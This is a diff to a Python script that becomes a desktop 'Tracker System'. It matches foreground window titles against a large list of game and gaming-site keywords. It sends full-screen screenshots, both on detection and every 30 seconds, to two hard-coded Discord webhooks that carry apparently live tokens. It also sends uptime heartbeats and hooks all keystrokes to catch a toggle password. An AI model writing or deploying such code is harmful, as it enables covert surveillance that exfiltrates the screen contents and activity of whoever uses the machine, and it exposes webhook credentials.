@@ -1,6 +1,6 @@
 import time
 import threading
-import subprocess
+import win32gui
 import pyautogui
 import keyboard
 import requests
@@ -8,63 +8,137 @@ import io
 from datetime import datetime
 from PIL import ImageGrab
 import json
-import os
 
 # ---------------- CONFIG ---------------- #
+TARGET_KEYWORDS = [
+    # General game platforms
+    "crazygames",
+    "poki",
+    "kizi",
+    "y8",
+    "y8 games",
+    "armor games",
+    "miniclip",
+    "addicting games",
+    "kongregate",
+    "gameflare",
+    "friv",
+    "friv games",
+    "silvergames",
+    "lagged",
+    "unblocked games",
+    "unblocked games 66",
+    "unblocked games 76",
+    "unblocked games 911",
+    "cool math games",
+    "math playground games",
+
+    # Popular games
+    "roblox",
+    "minecraft",
+    "fortnite",
+    "among us",
+    "call of duty",
+    "call of duty warzone",
+    "league of legends",
+    "valorant",
+    "counter strike",
+    "csgo",
+    "dota 2",
+    "overwatch",
+    "genshin impact",
+    "apex legends",
+    "pubg",
+    "clash royale",
+    "clash of clans",
+    "brawl stars",
+    "fifa",
+    "rocket league",
+
+    # Mobile / casual games
+    "subway surfers",
+    "temple run",
+    "geometry dash",
+    "bitlife",
+    "paper io",
+    "slither io",
+    "agar io",
+    "cookie clicker",
+    "idle games",
+    "clicker games",
+
+    # French / multilingual gaming phrases
+    "jeux gratuits",
+    "jeu gratuit",
+    "jeux en ligne",
+    "joue maintenant",
+    "jouer en ligne",
+    "spiele kostenlos",
+    "online spiele",
+    "juegos gratis",
+    "jugar ahora",
+
+    # Emulators & retro
+    "retro games",
+    "classic games",
+    "arcade games",
+    "flash games",
+    "browser games",
+    "nes games online",
+    "gba games online",
+
+    # Streaming & gaming communities
+    "twitch",
+    "twitch gaming",
+    "kick streaming",
+    "youtube gaming",
+    "discord gaming",
+    "steam",
+    "epic games",
+    "origin games",
+    "battle net"
+]
+
 PASSWORD = "stop123"    # Password to toggle tracking
 TOGGLE_HOTKEY = "ctrl+alt+p"  # Alternative hotkey to toggle tracking
 
-# Discord Webhook Configuration
+# Discord Webhook Configuration (BOTH WEBHOOKS)
 DISCORD_WEBHOOKS = [
     "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
     "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
 ]
 SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
-SCREENSHOT_INTERVAL = 300  # 5 minutes in seconds
-CAMERA_DURATION = 10  # How long to keep camera open (seconds)
-
-# Camera application path (Windows default camera)
-CAMERA_PATH = "microsoft.windows.camera:"
+SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
+PERIODIC_SCREENSHOT_INTERVAL = 30  # Take screenshot every 30 seconds (even without detection)
+HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
 
 # ---------------- GLOBALS ---------------- #
+lock = threading.Lock() # Thread safety
 tracking_enabled = True  # Master toggle for tracking
 password_buffer = ""    # Stores typed characters for password detection
 last_key_time = 0       # For clearing password buffer after timeout
-last_screenshot_time = time.time()  # Track when last screenshot was taken
+last_heartbeat_time = time.time()  # Track when last heartbeat was sent
+last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
 program_start_time = time.time()  # Track program start time
-camera_process = None  # Track camera process
 
-def open_camera():
-    """Open the Windows Camera application"""
-    global camera_process
-    try:
-        print("[CAMERA] Opening camera application...")
-        # Open Windows Camera using its app URI
-        camera_process = subprocess.Popen(
-            ["start", CAMERA_PATH],
-            shell=True,
-            creationflags=subprocess.CREATE_NEW_CONSOLE
-        )
-        
-        # Give camera time to open
-        time.sleep(3)
-        return True
-    except Exception as e:
-        print(f"[CAMERA ERROR] Failed to open camera: {e}")
-        return False
+# Track focus state to prevent spam
+current_focused_hwnd = None  # Current window handle
+current_focused_title = None  # Current window title
+last_alert_time = 0  # Last time we sent an alert
+alert_cooldown = 60  # 60 seconds minimum between alerts for same window
+recently_alerted_windows = {}  # Dict to track recently alerted windows: {hwnd: (title, alert_time)}
 
-def close_camera():
-    """Close the camera application"""
-    global camera_process
-    try:
-        if camera_process:
-            # Try to gracefully close the camera
-            camera_process.terminate()
-            camera_process.wait(timeout=2)
-            camera_process = None
-            print("[CAMERA] Camera closed")
-    except Exception as e:
-        print(f"[CAMERA ERROR] Failed to close camera: {e}")
+def title_matches_target(title: str) -> bool:
+    title_lower = title.lower()
+    return any(keyword in title_lower for keyword in TARGET_KEYWORDS)
+
+def get_matching_keyword(title: str) -> str:
+    """Returns which keyword matched the title"""
+    title_lower = title.lower()
+    for keyword in TARGET_KEYWORDS:
+        if keyword in title_lower:
+            return keyword
+    return ""
 
 def take_screenshot():
     """Take a screenshot of the entire screen"""
@@ -174,22 +248,22 @@ def send_to_all_webhooks(payload, screenshot=None):
     print(f"[DISCORD] Sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
     return success_count > 0
 
-def send_discord_alert(screenshot=None):
-    """Send screenshot to Discord webhooks"""
+def send_discord_alert(title, keyword, screenshot=None):
+    """Send alert to Discord webhooks with optional screenshot"""
     # Prepare the message
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     embed = {
-        "title": "📸 Periodic Screenshot",
-        "description": f"**Time:** `{current_time}`\n**Interval:** `{SCREENSHOT_INTERVAL//60} minutes`",
-        "color": 3447003,  # Blue color
+        "title": "⚠️ Target Application Detected",
+        "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`",
+        "color": 16711680,  # Red color
         "footer": {
-            "text": "Camera Screenshot System"
+            "text": "Tracker System"
         }
     }
     
     payload = {
         "embeds": [embed],
-        "content": f"🕐 **Scheduled screenshot taken at {current_time}**"
+        "content": f"🚨 **Target detected:** {title[:100]}"
     }
     
     return send_to_all_webhooks(payload, screenshot)
@@ -201,17 +275,17 @@ def send_discord_status(status):
         color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
         
         embed = {
-            "title": f"🔄 Screenshot System {status}",
-            "description": f"Screenshot system has been **{status.lower()}**\n**Time:** `{current_time}`\n**Interval:** `{SCREENSHOT_INTERVAL//60} minutes`",
+            "title": f"🔄 Tracking {status}",
+            "description": f"Tracking has been **{status.lower()}**\n**Time:** `{current_time}`",
             "color": color,
             "footer": {
-                "text": "Camera Screenshot System"
+                "text": "Tracker System"
             }
         }
         
         payload = {
             "embeds": [embed],
-            "content": f"📊 **Screenshot System Status Changed**"
+            "content": f"📊 **Tracker Status Changed**"
         }
         
         return send_to_all_webhooks(payload)
@@ -220,23 +294,95 @@ def send_discord_status(status):
         print(f"[DISCORD STATUS ERROR] {e}")
         return False
 
+def send_heartbeat():
+    """Send heartbeat webhook to confirm PC is active"""
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        uptime_seconds = int(time.time() - program_start_time)
+        
+        # Convert uptime to readable format
+        hours = uptime_seconds // 3600
+        minutes = (uptime_seconds % 3600) // 60
+        seconds = uptime_seconds % 60
+        
+        embed = {
+            "title": "💓 PC Heartbeat",
+            "description": f"**PC is active and running**\n**Time:** `{current_time}`\n**Uptime:** `{hours}h {minutes}m {seconds}s`\n**Tracking Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`",
+            "color": 3447003,  # Blue color
+            "footer": {
+                "text": "Tracker System"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed]
+        }
+        
+        success = send_to_all_webhooks(payload)
+        if success:
+            print(f"[HEARTBEAT] Sent to all webhooks at {current_time}")
+        return success
+            
+    except Exception as e:
+        print(f"[HEARTBEAT ERROR] {e}")
+        return False
+
+def send_periodic_screenshot():
+    """Send periodic screenshot to Discord (every 30 seconds)"""
+    try:
+        # Get current window info even if not a target
+        hwnd = win32gui.GetForegroundWindow()
+        title = win32gui.GetWindowText(hwnd).strip()
+        
+        if not title:
+            title = "No window title"
+        
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Take screenshot
+        screenshot = take_screenshot() if SEND_SCREENSHOTS else None
+        
+        # Prepare message
+        embed = {
+            "title": "⏰ Periodic Screenshot",
+            "description": f"**Window Title:** `{title}`\n**Time:** `{current_time}`\n**Interval:** `{PERIODIC_SCREENSHOT_INTERVAL} seconds`",
+            "color": 10181046,  # Purple color
+            "footer": {
+                "text": "Tracker System - Periodic Capture"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed],
+            "content": f"📸 **Periodic screenshot captured**"
+        }
+        
+        success = send_to_all_webhooks(payload, screenshot)
+        if success:
+            print(f"[PERIODIC] Sent periodic screenshot at {current_time} (Window: '{title[:50]}...')")
+        return success
+            
+    except Exception as e:
+        print(f"[PERIODIC ERROR] {e}")
+        return False
+
 def send_startup_message():
     """Send webhook when the program starts"""
     try:
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         embed = {
-            "title": "🚀 Screenshot System Started",
-            "description": f"**Camera screenshot system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Screenshot Interval:** `{SCREENSHOT_INTERVAL//60} minutes`",
+            "title": "🚀 Tracker Started",
+            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Periodic Screenshots:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds`",
             "color": 3066993,  # Green color
             "footer": {
-                "text": "Camera Screenshot System"
+                "text": "Tracker System"
             }
         }
         
         payload = {
             "embeds": [embed],
-            "content": "📱 **System Online** - Screenshot system is now active"
+            "content": "📱 **System Online** - Tracker is now active"
         }
         
         success = send_to_all_webhooks(payload)
@@ -250,10 +396,13 @@ def send_startup_message():
 
 def toggle_tracking():
     """Toggle tracking on/off"""
-    global tracking_enabled, password_buffer
+    global tracking_enabled, password_buffer, recently_alerted_windows
     tracking_enabled = not tracking_enabled
     status = "ENABLED" if tracking_enabled else "DISABLED"
-    print(f"[SYSTEM] Screenshot system {status}")
+    print(f"[TRACKING] Tracking {status}")
+    
+    # Clear recently alerted windows when toggling
+    recently_alerted_windows.clear()
     
     # Send Discord notification about status change
     threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
@@ -306,97 +455,118 @@ def setup_keyboard_listener():
     """Setup global keyboard listeners"""
     # Hotkey to toggle tracking
     keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
-    print(f"[HOTKEY] Press '{TOGGLE_HOTKEY}' to toggle screenshot system")
-    print(f"[PASSWORD] Type '{PASSWORD}' to toggle screenshot system")
+    print(f"[HOTKEY] Press '{TOGGLE_HOTKEY}' to toggle tracking")
+    print(f"[PASSWORD] Type '{PASSWORD}' to toggle tracking")
     
     # General key listener for password typing
     keyboard.hook(on_key_event, suppress=False)
     
     return keyboard
 
-def capture_screenshot_cycle():
-    """Open camera, take screenshot, and close camera"""
-    if not tracking_enabled:
-        return
+def should_send_alert(hwnd, title, keyword):
+    """Check if we should send an alert for this window"""
+    global current_focused_hwnd, current_focused_title, last_alert_time, recently_alerted_windows
     
-    try:
-        print("[CAPTURE] Starting screenshot cycle...")
+    current_time = time.time()
+    
+    # Clean up old entries from recently_alerted_windows
+    to_remove = []
+    for window_hwnd, (window_title, alert_time) in list(recently_alerted_windows.items()):
+        if current_time - alert_time > alert_cooldown * 2:  # Clean up after 2x cooldown
+            to_remove.append(window_hwnd)
+    
+    for hwnd_key in to_remove:
+        del recently_alerted_windows[hwnd_key]
+    
+    # Check if this is a new focus or different window
+    if hwnd == current_focused_hwnd and title == current_focused_title:
+        # Same window still focused, check cooldown
+        if current_time - last_alert_time < alert_cooldown:
+            return False  # Still in cooldown period
         
-        # Open camera
-        if open_camera():
-            # Wait a bit for camera to fully open
-            time.sleep(2)
-            
-            # Take screenshot
-            screenshot = take_screenshot()
-            
-            if screenshot:
-                # Send to Discord
-                send_discord_alert(screenshot)
-                print("[CAPTURE] Screenshot captured and sent successfully")
-            else:
-                print("[CAPTURE] Failed to capture screenshot")
-            
-            # Keep camera open for configured duration
-            time.sleep(CAMERA_DURATION)
-            
-            # Close camera
-            close_camera()
-        else:
-            print("[CAPTURE] Failed to open camera, taking screenshot anyway")
-            # Take screenshot even if camera failed to open
-            screenshot = take_screenshot()
-            if screenshot:
-                send_discord_alert(screenshot)
-                
-    except Exception as e:
-        print(f"[CAPTURE ERROR] {e}")
-        # Ensure camera is closed even if error occurs
-        close_camera()
+        # Check if we've already alerted for this window recently
+        if hwnd in recently_alerted_windows:
+            window_title, last_alert = recently_alerted_windows[hwnd]
+            if current_time - last_alert < alert_cooldown:
+                return False  # Already alerted for this window recently
+    
+    # Update focus tracking
+    current_focused_hwnd = hwnd
+    current_focused_title = title
+    
+    # Record this alert
+    recently_alerted_windows[hwnd] = (title, current_time)
+    last_alert_time = current_time
+    
+    return True
 
-# ---------------- SCREENSHOT SCHEDULER THREAD ---------------- #
-def screenshot_scheduler():
-    """Periodically take screenshots every 5 minutes"""
-    global last_screenshot_time
+# ---------------- HEARTBEAT THREAD ---------------- #
+def heartbeat_monitor():
+    """Periodically send heartbeat every 5 minutes"""
+    global last_heartbeat_time
     
     while True:
         try:
             current_time = time.time()
             
-            # Check if it's time to take a screenshot
-            if current_time - last_screenshot_time >= SCREENSHOT_INTERVAL and tracking_enabled:
-                print(f"[SCHEDULER] Time for scheduled screenshot ({SCREENSHOT_INTERVAL//60} minute interval)")
-                
-                # Start capture in a separate thread
-                capture_thread = threading.Thread(target=capture_screenshot_cycle, daemon=True)
-                capture_thread.start()
-                
-                last_screenshot_time = current_time
+            # Check if it's time to send heartbeat
+            if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
+                threading.Thread(target=send_heartbeat, daemon=True).start()
+                last_heartbeat_time = current_time
             
-            # Sleep for 30 seconds and check again
-            time.sleep(30)
+            # Sleep for 1 minute and check again
+            time.sleep(60)
             
         except Exception as e:
-            print(f"[SCHEDULER ERROR] {e}")
-            time.sleep(30)
+            print(f"[HEARTBEAT MONITOR ERROR] {e}")
+            time.sleep(60)
+
+# ---------------- PERIODIC SCREENSHOT THREAD ---------------- #
+def periodic_screenshot_monitor():
+    """Periodically take screenshots every 30 seconds"""
+    global last_periodic_screenshot_time
+    
+    while True:
+        try:
+            current_time = time.time()
+            
+            # Check if it's time to take periodic screenshot
+            if (current_time - last_periodic_screenshot_time >= PERIODIC_SCREENSHOT_INTERVAL and 
+                tracking_enabled and SEND_SCREENSHOTS):
+                
+                threading.Thread(target=send_periodic_screenshot, daemon=True).start()
+                last_periodic_screenshot_time = current_time
+                print(f"[PERIODIC] Next screenshot in {PERIODIC_SCREENSHOT_INTERVAL} seconds")
+            
+            # Sleep for 1 second and check again
+            time.sleep(1)
+            
+        except Exception as e:
+            print(f"[PERIODIC MONITOR ERROR] {e}")
+            time.sleep(1)
 
 # ---------------- MAIN LOOP ---------------- #
-print("[SYSTEM] Camera screenshot system started...")
-print(f"[SYSTEM] Screenshots will be taken every {SCREENSHOT_INTERVAL//60} minutes")
-print(f"[SYSTEM] Camera will stay open for {CAMERA_DURATION} seconds")
-print("[SYSTEM] System is ENABLED by default")
+print("[SYSTEM] Monitoring started...")
+print("[SYSTEM] Tracking is ENABLED by default")
+print(f"[SYSTEM] Alert cooldown: {alert_cooldown} seconds per window")
+print(f"[SYSTEM] Periodic screenshots: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds")
 
 # Send startup webhook immediately
 if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
     print(f"[STARTUP] Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
     threading.Thread(target=send_startup_message, daemon=True).start()
     
-    # Start scheduler in a separate thread
-    scheduler_thread = threading.Thread(target=screenshot_scheduler, daemon=True)
-    scheduler_thread.start()
-    print(f"[SCHEDULER] Screenshot scheduler started (every {SCREENSHOT_INTERVAL//60} minutes)")
+    # Start heartbeat monitor in a separate thread
+    heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
+    heartbeat_thread.start()
+    print(f"[HEARTBEAT] Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
+    
+    # Start periodic screenshot monitor in a separate thread
+    periodic_thread = threading.Thread(target=periodic_screenshot_monitor, daemon=True)
+    periodic_thread.start()
+    print(f"[PERIODIC] Periodic screenshot monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
 else:
-    print("[DISCORD] No webhooks configured - skipping startup messages")
+    print("[DISCORD] No webhooks configured - skipping startup and heartbeat messages")
 
 # Test Discord connections
 valid_webhooks = []
@@ -404,6 +574,7 @@ for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
     if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
         print(f"[DISCORD] Webhook {i} configured")
         try:
+            # Just check if URL looks valid, don't actually send GET request
             if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
                 print(f"[DISCORD] Webhook {i} URL format is valid")
                 valid_webhooks.append(webhook_url)
@@ -422,15 +593,55 @@ else:
 # Setup keyboard listener
 kb_listener = setup_keyboard_listener()
 
-print("\n" + "="*50)
-print("SYSTEM ACTIVE - Press Ctrl+Alt+P or type 'stop123' to disable")
-print(f"Next screenshot in approximately {SCREENSHOT_INTERVAL//60} minutes")
-print("="*50 + "\n")
-
 try:
     while True:
-        # Keep main thread alive
-        time.sleep(1)
+        # Only process tracking if enabled
+        if tracking_enabled:
+            try:
+                hwnd = win32gui.GetForegroundWindow()
+                title = win32gui.GetWindowText(hwnd).strip()
+
+                if not title:
+                    time.sleep(0.05)
+                    continue
+
+                # Detect target
+                detected = title_matches_target(title)
+
+                if detected:
+                    keyword = get_matching_keyword(title)
+                    
+                    # Check if we should send an alert for this window
+                    if should_send_alert(hwnd, title, keyword):
+                        print(f"[DETECTION] Target detected: '{title}' (Keyword: {keyword})")
+                        
+                        # Small delay before taking screenshot to ensure window is focused
+                        time.sleep(SCREENSHOT_DELAY)
+                        
+                        # Take screenshot in main thread
+                        screenshot = take_screenshot() if SEND_SCREENSHOTS else None
+                        
+                        # Send alert to both webhooks
+                        alert_thread = threading.Thread(
+                            target=send_discord_alert,
+                            args=(title, keyword, screenshot),
+                            daemon=True
+                        )
+                        alert_thread.start()
+                    else:
+                        # Debug logging for skipped alerts
+                        if hwnd == current_focused_hwnd:
+                            print(f"[SKIPPED] Already alerted for this window recently: '{title[:50]}...'")
+                else:
+                    # Not a target window, update focus tracking
+                    current_focused_hwnd = hwnd
+                    current_focused_title = title
+
+            except Exception as e:
+                print(f"[ERROR] {e}")
+        
+        # Sleep regardless of tracking state
+        time.sleep(0.1)
 
 except KeyboardInterrupt:
     print("[EXIT] Interrupted by user.")
@@ -438,5 +649,4 @@ except KeyboardInterrupt:
 finally:
     # Cleanup
     keyboard.unhook_all()
-    close_camera()  # Ensure camera is closed
-    print("[SYSTEM] Camera screenshot system stopped")
+    print("[SYSTEM] Keyboard listeners stopped")
